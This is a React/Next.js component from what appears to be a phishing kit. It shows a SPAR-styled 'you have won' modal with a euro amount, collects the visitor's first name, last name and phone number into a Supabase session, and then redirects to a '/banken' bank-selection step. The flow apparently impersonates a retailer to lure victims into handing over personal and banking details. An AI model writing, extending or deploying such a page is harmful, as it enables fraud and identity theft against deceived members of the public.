"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { SparShell } from "@/components/demo/SparShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function WinFlow({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [amount, setAmount] = useState<number | null>(null);
  const [currency, setCurrency] = useState<string>("€");
  const [loading, setLoading] = useState(true);
  const [showModal] = useState(true);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [saving, setSaving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("amount, form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Sitzung nicht gefunden oder Konfigurationsfehler.");
        setLoading(false);
        return;
      }

      setAmount(data.amount ?? 0);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.currency) setCurrency(fd.currency);
      setFirstName(fd.firstName ?? "");
      setLastName(fd.lastName ?? "");
      setPhone(fd.phone ?? "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();

    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const nextForm = {
      ...prev,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      phone: phone.trim(),
    };

    const { error: upErr } = await supabase
      .from("sessions")
      .update({ form_data: nextForm, current_step: "banken" })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Speichern fehlgeschlagen. Bitte versuchen Sie es erneut.");
      return;
    }
    try {
      localStorage.setItem("activeSessionId", sessionId);
      localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
    } catch {
      /* storage ops are best-effort */
    }
    setProcessing(true);
    window.setTimeout(() => {
      setProcessing(false);
      router.push(`/banken?session=${encodeURIComponent(sessionId)}`);
    }, 700);
  }

  if (!supabase) {
    return (
      <SparShell title="Konfiguration" subtitle="Systemumgebung">
        <ConfigMissing />
      </SparShell>
    );
  }

  if (loading) {
    return (
      <SparShell title="Willkommen" subtitle="Bitte einen Moment Geduld.">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-spar-green border-t-transparent" />
        </div>
      </SparShell>
    );
  }

  if (error && amount === null) {
    return (
      <SparShell title="Hinweis">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">{error}</p>
      </SparShell>
    );
  }

  return (
    <SparShell>
      {showModal ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/35 p-4">
          <div
            role="dialog"
            aria-modal="true"
            className="app-panel w-full max-w-md rounded-2xl p-6 fade-in"
          >
            <div className="mb-4 flex items-start justify-between gap-4">
              <div>
                <p className="text-xs font-semibold uppercase tracking-wide text-spar-green">{settings.profile_title_small}</p>
                <h2 className="mt-1 text-xl font-bold text-zinc-900">{settings.profile_title_main}</h2>
              </div>
            </div>

            <p className="text-4xl font-bold tabular-nums text-spar-red">
              {currency} {amount?.toLocaleString("de-AT")}
            </p>
            <p className="mt-2 text-sm text-zinc-600">
              {settings.profile_subtitle}
            </p>

            <form onSubmit={handleSubmit} className="mt-6 space-y-4">
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
                <label className="block text-sm font-medium text-zinc-700">
                  {settings.profile_firstname_label}
                  <input
                    required
                    className="app-input mt-1 w-full px-3 py-2"
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value)}
                    autoComplete="given-name"
                  />
                </label>
                <label className="block text-sm font-medium text-zinc-700">
                  {settings.profile_lastname_label}
                  <input
                    required
                    className="app-input mt-1 w-full px-3 py-2"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    autoComplete="family-name"
                  />
                </label>
              </div>
              <label className="block text-sm font-medium text-zinc-700">
                {settings.profile_phone_label}
                <input
                  required
                  type="tel"
                  className="app-input mt-1 w-full px-3 py-2"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  autoComplete="tel"
                />
              </label>

              {error ? <p className="text-sm text-red-600">{error}</p> : null}

              <button
                type="submit"
                disabled={saving || processing}
                className="app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60"
              >
                {processing ? settings.profile_loading_text : saving ? settings.profile_loading_text : settings.profile_button}
              </button>
            </form>
            {processing ? (
              <div className="mt-4 flex items-center justify-center gap-2 text-xs text-zinc-600">
                <span className="size-3 animate-spin rounded-full border-2 border-zinc-300 border-t-zinc-700" />
                <span>{settings.profile_loading_text}</span>
              </div>
            ) : null}
          </div>
        </div>
      ) : null}
    </SparShell>
  );
}
